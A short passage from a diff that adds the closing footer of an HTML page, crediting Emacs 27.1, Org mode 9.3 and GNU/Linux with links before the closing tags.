+    Created with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="https://orgmode.org">Org</a> mode 9.3) on <a href='https://www.gnu.org'>GNU</a>/<a href='https://www.kernel.org/'>Linux</a>
+  </div>
+</footer>
+</div>
+</body>
+</html>
